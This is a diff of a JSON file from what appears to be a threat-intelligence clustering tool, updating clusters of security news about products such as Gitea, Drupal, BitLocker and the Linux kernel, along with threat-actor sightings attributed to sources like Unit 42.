       "cluster_ids": [
-        "22c0f52b2c",
-        "175d322664"
+        "b122af6a34",
+        "f0383fca84",
+        "312db5be97",
+        "8d3bd4937d"
       ]
     },
     {
-      "label": "supply chain targeting Linux kernel",
+      "label": "Gitea active exploitation",
       "dominant_features": {
         "threat_categories": [
-          "supply_chain",
-          "phishing_social_eng",
+          "active_exploitation",
+          "data_breach"
+        ],
+        "affected_industries": [
+          "aviation_defense"
+        ],
+        "affected_products": [
+          "Gitea",
+          "Kopia"
+        ],
+        "urgency_signals": [
+          "actively_exploited",
+          "preauth_unauth",
+          "no_patch_yet",
+          "poc_available"
+        ]
+      },
+      "cluster_count": 4,
+      "article_count": 8,
+      "cohesion": 0.216,
+      "shared_strong_signals": [
+        "Gitea"
+      ],
+      "cluster_ids": [
+        "f0383fca84",
+        "312db5be97",
+        "23ed126bfb",
+        "7cb47afdaa"
+      ]
+    },
+    {
+      "label": "active exploitation targeting Palo Alto Networks",
+      "dominant_features": {
+        "threat_categories": [
           "active_exploitation"
         ],
         "affected_products": [
-          "GitHub",
-          "Linux kernel"
+          "Palo Alto Networks",
+          "Kopia"
+        ],
+        "urgency_signals": [
+          "preauth_unauth",
+          "critical_cvss",
+          "no_patch_yet",
+          "poc_available"
+        ]
+      },
+      "cluster_count": 4,
+      "article_count": 10,
+      "cohesion": 0.208,
+      "shared_strong_signals": [
+        "Palo Alto Networks"
+      ],
+      "cluster_ids": [
+        "7a0bfcbd42",
+        "312db5be97",
+        "ede483f81e",
+        "8d3bd4937d"
+      ]
+    },
+    {
+      "label": "credential theft targeting Apple iOS/macOS",
+      "dominant_features": {
+        "threat_categories": [
+          "credential_theft",
+          "supply_chain"
+        ],
+        "affected_industries": [
+          "financial_services"
+        ],
+        "affected_products": [
+          "Apple iOS/macOS"
+        ]
+      },
+      "cluster_count": 4,
+      "article_count": 8,
+      "cohesion": 0.207,
+      "shared_strong_signals": [
+        "Apple iOS/macOS"
+      ],
+      "cluster_ids": [
+        "f160e8841b",
+        "62b9f51a33",
+        "64f7b4c761",
+        "47b2954a67"
+      ]
+    },
+    {
+      "label": "CVE-2026-9082 exploitation (Drupal)",
+      "dominant_features": {
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [
+          "Drupal",
+          "XWiki",
+          "GitHub"
+        ],
+        "cve_ids": [
+          "CVE-2026-9082",
+          "CVE-2026-0300",
+          "CVE-2026-23734",
+          "CVE-2026-44578"
+        ],
+        "urgency_signals": [
+          "preauth_unauth"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 10,
+      "cohesion": 0.353,
+      "shared_strong_signals": [
+        "CVE-2026-9082"
+      ],
+      "cluster_ids": [
+        "7a0bfcbd42",
+        "b090e3ad19",
+        "76e5533edc"
+      ]
+    },
+    {
+      "label": "Drupal vulnerability activity",
+      "dominant_features": {
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [
+          "Drupal",
+          "XWiki",
+          "GitHub"
+        ],
+        "cve_ids": [
+          "CVE-2026-9082",
+          "CVE-2026-0300",
+          "CVE-2026-23734",
+          "CVE-2026-44578"
+        ],
+        "urgency_signals": [
+          "preauth_unauth"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 10,
+      "cohesion": 0.353,
+      "shared_strong_signals": [
+        "Drupal"
+      ],
+      "cluster_ids": [
+        "7a0bfcbd42",
+        "b090e3ad19",
+        "76e5533edc"
+      ]
+    },
+    {
+      "label": "Linux kernel active exploitation",
+      "dominant_features": {
+        "threat_categories": [
+          "active_exploitation",
+          "supply_chain",
+          "phishing_social_eng"
+        ],
+        "affected_products": [
+          "Linux kernel",
+          "GitHub"
         ],
         "cve_ids": [
           "CVE-2026-31635",
@@ -10013,19 +10334,158 @@
           "poc_available"
         ]
       },
-      "cluster_count": 2,
-      "article_count": 3,
-      "cohesion": 0.502,
+      "cluster_count": 4,
+      "article_count": 6,
+      "cohesion": 0.247,
       "shared_strong_signals": [
-        "CVE-2026-31635",
-        "CVE-2026-42945",
-        "CVE-2026-45585",
-        "GitHub",
         "Linux kernel"
       ],
       "cluster_ids": [
+        "101998c91d",
         "5efb9aed3b",
-        "0a08121d4a"
+        "0a08121d4a",
+        "5331ba354c"
+      ]
+    },
+    {
+      "label": "apt espionage targeting Android",
+      "dominant_features": {
+        "threat_categories": [
+          "apt_espionage",
+          "active_exploitation"
+        ],
+        "affected_industries": [
+          "government",
+          "financial_services"
+        ],
+        "affected_products": [
+          "Android"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 8,
+      "cohesion": 0.27,
+      "shared_strong_signals": [
+        "Android"
+      ],
+      "cluster_ids": [
+        "23ed126bfb",
+        "1eba5f7636",
+        "bb2f04ae6d"
+      ]
+    },
+    {
+      "label": "CVE-2026-41091 exploitation (Microsoft BitLocker)",
+      "dominant_features": {
+        "threat_categories": [
+          "ddos",
+          "active_exploitation",
+          "vulnerability_disclosure"
+        ],
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [
+          "Microsoft BitLocker"
+        ],
+        "cve_ids": [
+          "CVE-2026-41091",
+          "CVE-2026-45498"
+        ],
+        "urgency_signals": [
+          "actively_exploited"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 7,
+      "cohesion": 0.232,
+      "shared_strong_signals": [
+        "CVE-2026-41091"
+      ],
+      "cluster_ids": [
+        "76e5533edc",
+        "22c0f52b2c",
+        "175d322664"
+      ]
+    },
+    {
+      "label": "CVE-2026-45498 exploitation (Microsoft BitLocker)",
+      "dominant_features": {
+        "threat_categories": [
+          "ddos",
+          "active_exploitation",
+          "vulnerability_disclosure"
+        ],
+        "affected_industries": [
+          "government"
+        ],
+        "affected_products": [
+          "Microsoft BitLocker"
+        ],
+        "cve_ids": [
+          "CVE-2026-41091",
+          "CVE-2026-45498"
+        ],
+        "urgency_signals": [
+          "actively_exploited"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 7,
+      "cohesion": 0.232,
+      "shared_strong_signals": [
+        "CVE-2026-45498"
+      ],
+      "cluster_ids": [
+        "76e5533edc",
+        "22c0f52b2c",
+        "175d322664"
+      ]
+    },
+    {
+      "label": "ShinyHunters: data breach",
+      "dominant_features": {
+        "threat_categories": [
+          "data_breach",
+          "phishing_social_eng",
+          "ransomware_extortion"
+        ],
+        "actor_attribution": [
+          "ShinyHunters"
+        ],
+        "affected_industries": [
+          "financial_services"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 10,
+      "cohesion": 0.231,
+      "shared_strong_signals": [
+        "ShinyHunters"
+      ],
+      "cluster_ids": [
+        "76e5533edc",
+        "10e5ab079e",
+        "72806b3289"
+      ]
+    },
+    {
+      "label": "Cisco vulnerability activity",
+      "dominant_features": {
+        "affected_products": [
+          "Cisco"
+        ]
+      },
+      "cluster_count": 3,
+      "article_count": 3,
+      "cohesion": 0.544,
+      "shared_strong_signals": [
+        "Cisco"
+      ],
+      "cluster_ids": [
+        "42b4567e7a",
+        "0c964a73a7",
+        "acf1b4dbc1"
       ]
     }
   ],
@@ -10185,6 +10645,24 @@
           "first_published": "2026-05-25T15:08:40+00:00"
         },
         {
+          "value": "Cl0p",
+          "cluster_id": "10e5ab079e",
+          "first_source": "Unit 42",
+          "first_published": "2026-05-27T22:00:46+00:00"
+        },
+        {
+          "value": "ShinyHunters",
+          "cluster_id": "10e5ab079e",
+          "first_source": "Unit 42",
+          "first_published": "2026-05-27T22:00:46+00:00"
+        },
+        {
+          "value": "APT29",
+          "cluster_id": "b35dce398c",
+          "first_source": "Unit 42",
+          "first_published": "2026-05-22T10:00:24+00:00"
+        },
+        {
           "value": "Cloud Atlas",
           "cluster_id": "d601f76167",
           "first_source": "Kaspersky Securelist",
@@ -10195,6 +10673,24 @@
           "cluster_id": "38ba01df8a",
           "first_source": "SANS Internet Storm Center",
           "first_published": "2026-05-27T21:14:03+00:00"
+        },
+        {
+          "value": "BlackCat/ALPHV",
+          "cluster_id": "9995e00c02",
+          "first_source": "Unit 42",
+          "first_published": "2026-05-28T10:00:53+00:00"
+        },
+        {
+          "value": "NoName057(16)",
+          "cluster_id": "9995e00c02",
+          "first_source": "Unit 42",
+          "first_published": "2026-05-28T10:00:53+00:00"
+        },
+        {
+          "value": "Scattered Spider",
+          "cluster_id": "9995e00c02",
+          "first_source": "Unit 42",
+          "first_published": "2026-05-28T10:00:53+00:00"
         },
         {
           "value": "Salt Typhoon",
